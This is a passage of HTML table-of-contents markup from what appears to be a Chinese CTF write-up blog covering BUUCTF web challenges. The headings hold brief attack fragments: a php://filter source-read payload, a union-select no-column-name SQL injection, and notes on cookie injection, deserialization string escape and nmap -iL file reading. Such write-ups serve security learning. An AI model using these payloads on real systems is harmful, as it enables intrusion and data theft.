href="#%E7%9B%B4%E6%8E%A5%E8%BE%93%E5%85%A5%E5%9B%9E%E6%98%BE%E4%BD%A0%E6%83%B3%E5%B9%B2%E4%BB%80%E4%B9%88%EF%BC%8C%E8%81%94%E7%B3%BB%E9%A2%98%E7%9B%AE%E5%88%A4%E6%96%AD%E5%8F%AF%E8%83%BD%E8%A6%81%E4%BB%8Ecookie%E5%A4%84%E6%B3%A8%E5%85%A5%EF%BC%8Cbp%E6%8A%93%E5%8C%85%E5%8F%88%E6%BC%8F%E4%BF%A1%E6%81%AF%EF%BC%8Ccookie%E9%83%BD%E6%8A%93%E4%B8%8D%E5%85%A8"><span class="toc-number">25.0.3.</span> <span class="toc-text">直接输入回显你想干什么，联系题目判断可能要从cookie处注入，bp抓包又漏信息，cookie都抓不全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9C%8B%E5%88%B0%E7%99%BB%E5%BD%95%E8%AF%B7%E6%B1%82%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84cookie%E6%9C%89user%E8%BF%99%E4%B8%80%E9%A1%B9%EF%BC%8C%E5%B0%86%E5%85%B6%E4%BF%AE%E6%94%B9%E4%B8%BA%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%88%90%E5%8A%9F%E5%BE%97%E5%88%B0flag"><span class="toc-number">25.0.4.</span> <span class="toc-text">浏览器看到登录请求包里面的cookie有user这一项，将其修改为注入命令，成功得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-number">26.</span> <span class="toc-text">[BSidesCF 2020]Had a bad day</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%B8%A4%E4%B8%AA%E6%8C%89%E9%92%AE%E5%8F%AF%E4%BB%A5%E7%9C%8B%E7%8C%AB%E7%8C%AB%E5%92%8C%E7%8B%97%E7%8B%97%EF%BC%8C%E6%B3%A8%E6%84%8F%E5%88%B0url%E4%B8%8Acategory%E5%9C%A8%E7%8C%AB%E7%8C%AB%E5%92%8C%E7%8B%97%E7%8B%97%E4%B9%8B%E9%97%B4%E6%94%B9%E5%8F%98%EF%BC%8C%E5%B0%9D%E8%AF%95%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81-category-php-filter-read-convert-base64-encode-resource-index-php"><span class="toc-number">26.0.1.</span> <span class="toc-text">访问两个按钮可以看猫猫和狗狗，注意到url上category在猫猫和狗狗之间改变，尝试伪协议读取源代码?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BEinclude-php-filter-read-convert-base64-encode-resource-index-php-php-%EF%BC%8C%E8%BF%99%E9%87%8C%E6%97%A2%E8%83%BD%E7%9C%8B%E5%87%BA%E6%9D%A5%E7%A1%AE%E5%AE%9E%E5%8F%AF%E4%BB%A5%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%EF%BC%8C%E4%B9%9F%E8%83%BD%E7%9C%8B%E5%87%BA%E6%9D%A5%E6%88%91%E4%BB%AC%E7%9A%84-php%E5%A4%9A%E4%BD%99%E4%BA%86%EF%BC%8C%E7%8C%9C%E6%B5%8B%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%87%AA%E5%8A%A8%E8%A1%A5-php"><span class="toc-number">26.0.2.</span> <span class="toc-text">然后报错回显include(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php.php)，这里既能看出来确实可以伪协议读取，也能看出来我们的.php多余了，猜测可能会自动补.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%BB%E6%8E%89-php%E5%90%8E%E6%88%90%E5%8A%9F%E8%AF%BB%E5%8F%96%E5%88%B0%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E9%87%8D%E8%A6%81%E7%9A%84%E4%B8%80%E6%AE%B5%E4%B8%BA"><span class="toc-number">26.0.3.</span> <span class="toc-text">去掉.php后成功读取到源代码，重要的一段为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E8%AF%BB%E5%8F%96flag%E4%BA%86%EF%BC%8C%E8%BF%99%E9%87%8Cdirsearch%E5%BA%94%E8%AF%A5%E6%98%AF%E8%83%BD%E6%89%AB%E5%87%BA%E6%9D%A5flag-php%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E7%BB%8F%E5%85%B8%E6%B2%A1%E6%89%AB%E5%87%BA%E6%9D%A5%EF%BC%8C%E6%89%AB%E5%87%BA%E6%9D%A5%E5%90%8E%E5%8F%91%E7%8E%B0%E5%8F%AA%E6%9C%89-%E6%89%80%E4%BB%A5%E8%BF%98%E6%98%AF%E8%A6%81%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96flag-php"><span class="toc-number">26.0.4.</span> <span class="toc-text">然后就是读取flag了，这里dirsearch应该是能扫出来flag.php的，但是经典没扫出来，扫出来后发现只有&lt;!-- Can you read this flag? --&gt;,所以还是要伪协议读取flag.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8Ebase64%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0flag"><span class="toc-number">26.0.5.</span> <span class="toc-text">然后base64解码得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">27.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php   php反序列化字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%90%8E%E7%82%B9%E5%87%BB%E7%9B%B4%E6%8E%A5%E7%BB%99%E4%BA%86%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">27.0.1.</span> <span class="toc-text">访问后点击直接给了源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-function-%E2%80%98phpinfo%E2%80%99%EF%BC%8C%E7%9C%8B%E5%88%B0auto-append-file%E9%A1%B9%E4%B8%BAd0g3-f1ag-php-%E8%BF%99%E9%87%8C%E4%B8%BA%E6%90%9C%E7%B4%A2%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E8%BF%87%E6%BB%A4%E8%AF%8Df1ag%E6%89%BE%E5%88%B0-%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%B8%BAflag%E6%89%80%E5%9C%A8%EF%BC%8C%E5%90%8C%E6%97%B6%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E8%BF%98%E8%A6%81file-get-contents%E5%87%BD%E6%95%B0%EF%BC%8C%E5%8F%AA%E8%A6%81%E8%83%BD%E6%8E%A7%E5%88%B6%E5%8F%82%E6%95%B0%E4%B8%BAd0g3-f1ag-php%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="toc-number">27.0.2.</span> <span class="toc-text">设置$function &#x3D;&#x3D; ‘phpinfo’，看到auto_append_file项为d0g3_f1ag.php(这里为搜索源代码中的过滤词f1ag找到)，可能为flag所在，同时源代码中还要file_get_contents函数，只要能控制参数为d0g3_f1ag.php即可得到flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87extract%E5%87%BD%E6%95%B0%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%A6%86%E7%9B%96-SESSION%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0%EF%BC%8C%E4%BD%86%E6%98%AF%E5%9B%A0%E4%B8%BA-SESSION-img-%E7%9A%84%E5%80%BC%E8%AE%BE%E7%BD%AE%E5%9C%A8%E6%88%91%E4%BB%AC%E8%A6%86%E7%9B%96%E5%90%8E%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E7%9B%B4%E6%8E%A5%E8%A6%86%E7%9B%96%E6%98%AF%E6%B2%A1%E6%9C%89%E6%84%8F%E4%B9%89%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%88%E5%9B%A0%E4%B8%BAfilter%E5%87%BD%E6%95%B0%E5%AF%B9%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%9B%BF%E6%8D%A2%E6%93%8D%E4%BD%9C%E6%BB%A1%E8%B6%B3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E7%9A%84%E6%9D%A1%E4%BB%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E6%9D%A5%E9%97%B4%E6%8E%A5%E6%8E%A7%E5%88%B6-SESSION-img"><span class="toc-number">27.0.3.</span> <span class="toc-text">通过extract函数我们可以覆盖_SESSION数组中的元素，但是因为_SESSION[img]的值设置在我们覆盖后，所以我们直接覆盖是没有意义的，但是又因为filter函数对序列化后的对象的替换操作满足反序列化字符串逃逸的条件，所以我们可以通过反序列化字符串逃逸来间接控制_SESSION[img]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E9%80%9A%E8%BF%87%E5%9C%A8user%E4%B8%AD%E6%B7%BB%E5%8A%A0%E8%A2%AB%E6%9B%BF%E6%8D%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E6%8E%A7%E5%88%B6%E4%B8%80%E9%83%A8%E5%88%86%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E6%9C%89%E5%85%B3function%E7%9A%84%E5%8F%98%E4%B8%BAuser%E7%9A%84%E5%80%BC"><span class="toc-number">27.0.4.</span> <span class="toc-text">这里通过在user中添加被替换的字符串来控制一部分序列化后的字符串中的有关function的变为user的值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E6%88%90%E5%8A%9F%E5%B0%86img%E7%9A%84%E5%80%BC%E6%94%B9%E4%B8%BA%E4%BA%86%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E5%8C%85%E5%90%AB%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84base64%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%8C%89-SESSION-%E9%94%AE%E5%90%8D-%E5%80%BCpost%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%E5%8D%B3%E5%8F%AF"><span class="toc-number">27.0.5.</span> <span class="toc-text">这样我们就成功将img的值改为了我们想要包含的文件的base64，接下来按_SESSION[键名]&#x3D;值post传入参数即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0-flag-flag-in-d0g3-fllllllag"><span class="toc-number">27.0.6.</span> <span class="toc-text">得到$flag &#x3D; &#39;flag in &#x2F;d0g3_fllllllag&#39;;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%8D%A2%E4%B8%AA%E8%A6%81%E5%8C%85%E5%90%AB%E7%9A%84%E5%8F%82%E6%95%B0%E5%8D%B3%E5%8F%AF"><span class="toc-number">27.0.7.</span> <span class="toc-text">然后换个要包含的参数即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag-3"><span class="toc-number">27.0.8.</span> <span class="toc-text">得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">28.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%90%8E%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BE%97%E5%88%B0%E8%B6%85%E7%BA%A7%E5%A4%9Aphp%E6%96%87%E4%BB%B6%E5%92%8C%E4%B8%80%E4%B8%AAindex-html"><span class="toc-number">28.0.1.</span> <span class="toc-text">访问后直接下载备份文件，得到超级多php文件和一个index.html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E4%BA%86%E5%87%A0%E4%B8%AA%E5%90%8E%E5%8F%91%E7%8E%B0%E5%9F%BA%E6%9C%AC%E4%B8%8A%E9%83%BD%E6%98%AFget%E5%92%8Cpost%E5%BE%88%E5%A4%9A%E5%BE%88%E6%8A%BD%E8%B1%A1%E7%9A%84%E5%8F%82%E6%95%B0%EF%BC%8C%E5%A6%82%E6%9E%9Ceval%EF%BC%8C%E4%BD%86%E6%98%AF%E5%A4%A7%E9%83%A8%E5%88%86%E9%83%BD%E4%BC%9A%E5%9C%A8eval%E4%B9%8B%E5%89%8D%E8%AE%BE%E7%BD%AE%E6%88%90%E6%96%B0%E7%9A%84%E5%80%BC%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%8D%E8%83%BD%E5%88%A9%E7%94%A8%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E7%94%A8%E8%84%9A%E6%9C%AC%E5%8E%BB%E6%B5%8B%E8%AF%95%E5%93%AA%E4%B8%80%E4%B8%AA%E8%83%BD%E7%94%A8"><span class="toc-number">28.0.2.</span> <span class="toc-text">看了几个后发现基本上都是get和post很多很抽象的参数，如果eval，但是大部分都会在eval之前设置成新的值，也就是不能利用，所以我们要用脚本去测试哪一个能用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%A0%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%E6%B5%8B%E8%AF%95%E5%A4%AA%E6%85%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E9%80%89%E6%8B%A9%E5%85%88%E5%88%A4%E6%96%AD%E6%98%AF%E5%93%AA%E4%B8%AAphp%E6%96%87%E4%BB%B6%EF%BC%8C%E5%86%8D%E5%88%A4%E6%96%AD%E6%98%AF%E5%93%AA%E4%B8%AA%E5%8F%82%E6%95%B0"><span class="toc-number">28.0.3.</span> <span class="toc-text">因为一个一个参数测试太慢，所以选择先判断是哪个php文件，再判断是哪个参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%8F%82%E6%95%B0%E5%90%8E%E5%8E%BB%E7%8E%AF%E5%A2%83%E9%87%8C%E9%9D%A2RCE%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="toc-number">28.0.4.</span> <span class="toc-text">找到参数后去环境里面RCE即可得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">29.</span> <span class="toc-text">[BUUCTF 2018]Online Tool      [网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap%E5%91%BD%E4%BB%A4"><span class="toc-number">30.</span> <span class="toc-text">nmap命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98%E5%9B%A0%E4%B8%BA%E6%9C%89%E5%AF%B9php%E7%9A%84waf%E6%89%80%E4%BB%A5%E8%A6%81%E7%94%A8"><span class="toc-number">30.0.1.</span> <span class="toc-text">第二题因为有对php的waf所以要用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E9%A2%84%E6%9C%9F%E8%A7%A3%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E9%87%8C%E9%9D%A2%E7%BB%99%E4%BA%86flag%E5%9C%A8-flag%EF%BC%8C%E6%89%80%E4%BB%A5%E5%88%A9%E7%94%A8-iL%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96flag"><span class="toc-number">30.0.2.</span> <span class="toc-text">也可以用预期解读取文件的方法，源代码里面给了flag在&#x2F;flag，所以利用-iL参数读取flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-number">31.</span> <span class="toc-text">[SWPU2019]Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E6%97%B6%E5%8F%91%E7%8E%B0admin%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%90%8E%E7%99%BB%E5%BD%95%EF%BC%8C%E7%9C%8B%E5%88%B0%E5%B9%BF%E5%91%8A%E4%BC%9A%E6%89%93%E5%8D%B0%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%8A%EF%BC%8C%E4%BB%A5%E4%B8%BA%E6%98%AFxss%EF%BC%8C%E6%B2%A1%E6%83%B3%E5%88%B0%E6%98%AFsql%E6%B3%A8%E5%85%A5"><span class="toc-number">31.0.1.</span> <span class="toc-text">注册时发现admin已经存在，后登录，看到广告会打印在页面上，以为是xss，没想到是sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8%E5%B9%BF%E5%91%8A%E5%90%8D%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%A8%E6%88%91%E5%B0%9D%E8%AF%95%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%97%B6%E5%8F%91%E7%8E%B0-%E8%A2%AB%E6%9B%BF%E6%8D%A2%EF%BC%8C%E6%97%A2%E7%84%B6%E5%AD%98%E5%9C%A8%E8%BF%87%E6%BB%A4%EF%BC%8C%E9%82%A3%E5%BF%85%E7%84%B6%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%B0%9D%E8%AF%95sql%E6%B3%A8%E5%85%A5%E5%90%8E%E5%8F%91%E7%8E%B0%E8%A6%81%E8%BF%9B%E5%88%B0%E5%B9%BF%E5%91%8A%E8%AF%A6%E6%83%85%E9%87%8C%E9%9D%A2%E6%89%8D%E8%83%BD%E8%A7%A6%E5%8F%91%EF%BC%8C%E5%8E%9F%E7%90%86%E4%B8%BA%E5%9C%A8%E5%9B%9E%E6%98%BE%E5%88%B0%E9%A1%B5%E9%9D%A2%E6%97%B6%E8%BF%9B%E8%A1%8C%E4%BA%86%E8%BD%AC%E4%B9%89%E5%A4%84%E7%90%86%EF%BC%8C%E4%BD%86%E5%9C%A8%E8%BF%9B%E5%88%B0%E5%B9%BF%E5%91%8A%E8%AF%A6%E6%83%85%E6%97%B6%E4%BC%9A%E5%86%8D%E6%AC%A1%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">31.0.2.</span> <span class="toc-text">注入点在广告名，这个在我尝试模版注入时发现+被替换，既然存在过滤，那必然存在漏洞，尝试sql注入后发现要进到广告详情里面才能触发，原理为在回显到页面时进行了转义处理，但在进到广告详情时会再次从数据库中获得初始信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E6%B3%A8%E5%85%A5%E4%BA%86%EF%BC%8C%E8%BF%87%E6%BB%A4%E8%BF%98%E6%98%AF%E4%B8%8D%E5%B0%91%E7%9A%84%EF%BC%8C%E6%9C%89%E7%A9%BA%E6%A0%BC%EF%BC%8C-%EF%BC%8C-%EF%BC%8Cor-and%EF%BC%8C-%E7%AD%89%EF%BC%8C%E7%A9%BA%E6%A0%BC%E7%94%A8-%EF%BC%8C%E4%BD%86%E6%98%AFor%E8%BF%98%E6%98%AF%E6%8C%BA%E8%87%B4%E5%91%BD%E7%9A%84%EF%BC%8C%E6%97%A2%E7%A0%B4%E5%9D%8F%E4%BA%86%E6%88%91%E4%BB%AC%E7%9A%84order%EF%BC%8C%E4%B9%9F%E7%A0%B4%E5%9D%8F%E4%BA%86%E6%88%91%E4%BB%AC%E7%9A%84information%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E7%A0%B4%E5%9D%8F%E6%8E%89%E4%BA%86%E6%88%91%E4%BB%AC%E7%9A%84%E6%B3%A8%E9%87%8A%E7%AC%A6%EF%BC%8C%E9%80%89%E6%8B%A9%E7%94%A8%E2%80%99%E9%97%AD%E5%90%88%E5%90%8E%E9%9D%A2%E7%9A%84%E2%80%99%EF%BC%8C%E5%B0%86sql%E8%AF%AD%E5%8F%A5%E5%8F%98%E4%B8%BAselect-from-ads-where-title-title-%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4-limit-0-1"><span class="toc-number">31.0.3.</span> <span class="toc-text">然后就是注入了，过滤还是不少的，有空格，-，+，or,and，#等，空格用&#x2F;**&#x2F;，但是or还是挺致命的，既破坏了我们的order，也破坏了我们的information，然后就是破坏掉了我们的注释符，选择用’闭合后面的’，将sql语句变为select * from ads where title &#x3D; &#39;$title&#39;注入命令,&#39;&#39; limit 0,1;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E8%BF%98%E6%98%AF%E5%85%88%E7%9C%8B%E7%9C%8B%E5%88%97%E6%95%B0%E5%90%A7%EF%BC%8Corder-by%E7%94%A8group-by%E4%BB%A3%E6%9B%BF%EF%BC%8C%E5%BD%93%E7%84%B6%E7%9B%B4%E6%8E%A5union-select-1-2-3%EF%BC%8C%C2%B7%C2%B7%C2%B7%E4%B9%9F%E5%8F%AF%E4%BB%A5"><span class="toc-number">31.0.4.</span> <span class="toc-text">不过还是先看看列数吧，order by用group by代替，当然直接union select 1,2,3，···也可以</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%8C%E4%BA%86%E6%97%A0%E6%95%8C%E4%BA%86%EF%BC%8C22%E4%B8%AA%E5%88%97%E4%B9%9F%E6%98%AF%E6%97%A0%E6%95%8C%E4%BA%86"><span class="toc-number">31.0.5.</span> <span class="toc-text">无敌了无敌了，22个列也是无敌了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E4%BD%8D%E4%B8%BA2-3"><span class="toc-number">31.0.6.</span> <span class="toc-text">回显位为2,3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E4%B8%BAweb1"><span class="toc-number">31.0.7.</span> <span class="toc-text">数据库名为web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E6%80%8E%E4%B9%88%E6%9B%BF%E4%BB%A3information-schema%EF%BC%8C%E6%88%91%E4%BB%AC%E8%A6%81%E6%89%BE%E5%88%B0%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AA%E4%B9%9F%E8%83%BD%E4%BF%9D%E5%AD%98%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8mysql-innodb-table-stats"><span class="toc-number">31.0.8.</span> <span class="toc-text">然后就是怎么替代information_schema，我们要找到另外一个也能保存所有数据的表，这里使用mysql.innodb_table_stats</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E8%A1%A8%E5%90%8D%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%98%E6%98%AF%E6%B2%A1%E6%9C%89%E5%88%97%E5%90%8D%EF%BC%8C%E8%BF%99%E9%87%8C%E8%A6%81%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">31.0.9.</span> <span class="toc-text">获得表名，但是还是没有列名，这里要无列名注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E9%9D%A2%E8%BF%99%E5%8F%A5%E8%AF%9D%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%BA-select-1-2-as-b-3-union-select-from-users-a%E5%88%9B%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8C%85%E5%90%ABusers%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E4%B8%94%E5%88%97%E5%90%8D%E6%9B%B4%E6%8D%A2%E4%B8%BA1-2-3%E7%9A%84a%E8%A1%A8%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E7%94%A8as%E5%BC%95%E7%94%A8%E6%88%96%E8%80%85%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%94%A8%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%BC%95%E7%94%A8%E6%9D%A5%E8%A1%A8%E7%A4%BA%E5%88%97%E5%90%8D%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE"><span class="toc-number">31.0.10.</span> <span class="toc-text">上面这句话的原理为(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;b,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a创建了一个包含users所有数据且列名更换为1,2,3的a表，然后再用as引用或者在前面用反引号引用来表示列名即可获得数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%8C%9C%E9%94%99%E5%88%97%E4%BA%86%EF%BC%8C%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%B1%E6%8B%BF%E5%88%B0flag%E4%BA%86"><span class="toc-number">31.0.11.</span> <span class="toc-text">第一次猜错列了，第二次就拿到flag了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-number">32.</span> <span class="toc-text">[极客大挑战 2019]FinalSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%8E%BB%E4%B9%8B%E5%90%8E%E6%8F%90%E7%A4%BA%E4%BA%86sql%E7%9B%B2%E6%B3%A8%EF%BC%8C%E5%85%88%E6%89%BE%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%8F%82%E6%95%B0%E5%B0%9D%E8%AF%95%E5%90%8E%E5%8F%91%E7%8E%B0%E5%9B%9E%E6%98%BE%E4%B8%80%E7%9B%B4%E9%83%BD%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E7%94%A8sleep%E4%B9%9F%E6%B2%A1%E7%94%A8%EF%BC%8C%E4%B8%80%E5%BC%80%E5%A7%8B%E8%BF%98%E4%BB%A5%E4%B8%BA%E6%98%AF%E5%92%8C%E4%B9%8B%E5%89%8D%E4%B8%80%E4%B8%AA%E9%A2%98%E4%B8%80%E6%A0%B7%E6%9A%97ban%E4%BA%86sleep%E8%A6%81%E7%94%A8randombolb%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF%EF%BC%8C%E4%BD%86%E6%98%AF%E7%9C%8B%E8%A7%81%E8%BF%98%E6%9C%89%E5%87%A0%E4%B8%AA%E6%8C%89%E9%92%AE%E6%B2%A1%E6%8C%89%EF%BC%8C%E5%85%88%E6%8C%89%E4%B8%80%E4%B8%8B%E7%9C%8B%E7%9C%8B"><span class="toc-number">32.0.1.</span> <span class="toc-text">进去之后提示了sql盲注，先找找注入点，登录界面的两个参数尝试后发现回显一直都是一样的，用sleep也没用，一开始还以为是和之前一个题一样暗ban了sleep要用randombolb函数代替，但是看见还有几个按钮没按，先按一下看看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 